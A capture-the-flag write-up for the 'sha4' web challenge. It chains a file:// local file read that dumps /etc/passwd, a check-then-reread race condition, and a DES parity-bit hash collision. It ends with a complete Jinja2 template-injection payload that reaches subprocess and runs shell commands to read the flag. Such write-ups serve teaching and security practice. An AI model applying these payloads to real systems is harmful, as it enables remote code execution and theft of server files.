# sha4 (web, 300pts, 16 solves)

> tl;dr
> local file read, race condition, hash collision, template injection


[image extracted text: shaaaatterla
collision attack; sume hashes
some people on the internet said you
should stop using sha-1. if you aren't
sure why;
please see the infographic
0+
the right. but now what do you use? sha-
2? no. sha-2 is lame, it's still vulnerable
sha-1
mnuti
length extension attacks! sha-3? it's
good doc
3718.42
got weird sponge stuff, that sounds gross
ou like sponges? of course you
cont
isnt
time we switch to
0+
something new? something
better???
sha-1
nenenal
bad doc
3713.47
that' s why we ve created sha-4. it is
based on well tested and strong
algorithms that are made to be fast in
0+
hardware, and weve had like decades to
make them fast in software,
so idk; it's
sha:
probably pretty good. if you don't believe
bad doc
p| =t | p
us, look at the
infographic on the right, it
clearly shows that sha-4 is totes the
best.
of cours
we are very forward looking:
although we expect sha-4 is probably the
best hash function ever we would like to
hear back about comments people may
have_
please use the form below
indicate
our opinions on sha-4 as we
are weird cryptography people
obviously
the correct format for comments
encoded in asn.
encoded in hex. if you
don't find this format convenient, you are
probably not qualified to make comments
on our hash algorithm anyway if you have
nicely typeset list of comments (must
be latex; no mice
osoft word
and no bull shit libre office
crap) you can also specify
url for that
to upload it
some reasonable questions you may ask
what is
sha? why are sponges so
gross
what if, like, dude;
what if sha-5
was just the identity function?
hex asni]



start off by noticing that we have a local file read via the second form:


[image extracted text: http iisha4.chal pwning xxxlupload
form-data
x-www-form-urlencoded
raw
file {{letc passwd
text
value
text
send
preview
add to collection
body
headers "81
status 200 ok
time  656 ms
pretty
raw
preview
json
xml
root:x:o:o:rcot:/root:/bin/bash
daemon:x:l:l:daemon
{usr{sbin:/usr/sbin/nologin
bin:x:2:2:bin:
din:
lusr/sbin/nologin
sys:x:3
dev:
usr/sbin/nologin
syncxx:4;65834:sync: #5in:bbinnoyng
games:x:
68:games
{usr
games:/usr/ sbin/nologin
man:x:6:12:man: /var/cache/man:/usr/sbin/nologin
ip:x:7:7:lp:/varf
pravar/seconalpd
:jusr{sbin/nologin
9 mail:x:8:8'
{usr/
sbin/nolcg
neus:x:
:9:news: /var
pool/news: /usrfsbin/nologin
wucp:x:10
18:uucp: /vare
jusr/sbin/nologin
12 proxy:x:13:13:proxy:/bin:
'gpoosryysin/uologbic
mao -
data:x:33:33:www-data:/var/ww:/usr]sbin/nologin
packup:x:34:34:backup
/backups
lusr {sbin{nologin
list:x:38:38:mailing
list
ivar/list:/usr/sbin/nologin
irc:x:39:39:ircd: {varlrun/ircd
{usrlsbin/
nologin
gnats:x:41:41:gnats bug;
reporting
system
(admin) : /varflib/gnats:/usr/sbin/nologin
18  nobody:x:65534:65534:nobody: /nonexistent:/usrfsbinfnologin
19 systemd-timesync:x:100:102:systemd
tine
synchronization,_
irun/ systemd: /bin/false
systemd-network:x:101:103:systemd network mlanagement,,
run/systemd/netif:/bin/false
2
systemd-resolve:x:102:104:systemd resolver
trun/ systend/resolve: /bin/false
systemd_
bus-proxy:x:103:185
systemd
bus proxy,,:/run/systemd: /bin/false
23 syslog:x:184.108: : /home_
syslog:/bin/false
105:65534
:{nonexistent: /bin/false
62
:x:106:65534:
{var/lib/ixd/ : /bin/false
mes
sagebus:x:107
111:
[var/runfdbus: /bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x: 189:65534:dnsmasq
{varllib/misc: /binffalse
29  sshd:x:110:65534::/var/run;
{hi (u5r/sbin/nologin
ntp:x:lll:115::/home/ntp: {binffalse
ubuntu:x:1080
1008:
{nome
uountu:
ke]
mana]


lets find out where the application root is: `etc/apache2/sites-enabled/000-default.conf`

```
<virtualhost *:80>
	servername sha4

	wsgidaemonprocess sha4 user=www-data group=www-data threads=8 request-timeout=10
	wsgiscriptalias / /var/www/sha4/sha4.wsgi

	
    <directory /var/www/sha4>
		wsgiprocessgroup sha4
		wsgiapplicationgroup %{global}
		wsgiscriptreloading on
		order deny,allow
		allow from all
	</directory>

	errorlog ${apache_log_dir}/error.log
	customlog ${apache_log_dir}/access.log combined


</virtualhost>
```

great!


[file:////var/www/sha4/server.py](server.py)

[file:////var/www/sha4/sha4.py](sha4.py)



``` python
  out_text = str(decode(ber))
  open(f, "w").write(out_text)

  if is_unsafe(out_text):
    return render_template_string(unsafe)

  commentt = comment % open(f).read()
  return render_template_string(commentt, comment=out_text.replace("\n","<br/>"))
```

is vulnerable to race condition and template injection.
we can first send a valid input that passes the `is_unsafe` check and then a malicious input that injects the template.
the contents of the file will be overwritten for the first execution so it will actually evaluate the malicious payload.

but in order to do that we need 2 different inputs that produce the same `hash`:

``` python
def hash(x):
  h0 = "sha4_is_"
  h1 = "da_best!"
  keys = unpad(x)
  for key in keys:
    h0 = des.new(key).encrypt(h0)
    h1 = des.new(key).encrypt(h1)
  return h0+h1
```


`unpad` function works as expected, it takes 7 8-bit bytes and output 8 7-bit bytes, pic rel:


[image extracted text: 00000000
00110111
10100010
00110101
11110010
00110011
00110010
00110001
00000000
00000000
00000000
00000000
00000000
00000000
00000000
0110001
00000000
00000000
00000000
00000000
00000000
00000000
110010
00110001
00000000
00000000
00000000
00000000
00000000
1001100
110010
00110001
00000000
00000000
00000000
00000000
0010001
10011
110010
0110001
00000000
00000000
00000000
01011111
0010001
10011
110010
00110001
00000000
00000000
01000110
1011111
0010001
10011
110010
0110001
00000000
01101000
01000110
01011111
0010001
010011
110010
0110001
00011011
01101000
01000110
01011111
0010001
01001100
110010
00110001]


des.encrypt was the problem. 
des, although takes 8 bytes as key, is not using all 64 bits, but only 56.
it ignores lsb of each byte.
this means we can actually get identical encryption results as long as the key differs only on lsb.
so we could perform bitflips to bypass the whitelist with one of the payloads, while the other payload with malicious injection would have the same hash.


after generating a valid input pair we simply smash them agains the server and hope to get the flag via usual template injection:

```python
{{3*3*3*3}}
{% set loadedclasses = " ".__class__.__mro__[2].__subclasses__() %}
{% for loadedclass in loadedclasses %} {% if loadedclass.__name__ == "catch_warnings".strip() %}
	{% set builtinsreference = loadedclass()._module.__builtins__ %}
	{% set os = builtinsreference["__import__".strip()]("subprocess".strip()) %}
		{{ os.check_output("cat sha4/flag_bilaabluagbiluariglublaireugrpoop".strip(), shell=true) }}
	{% endif %}
{% endfor %}
```

[full script](script.py)

which gives `pctf{th3 security aspect of cyber is very very tough}`
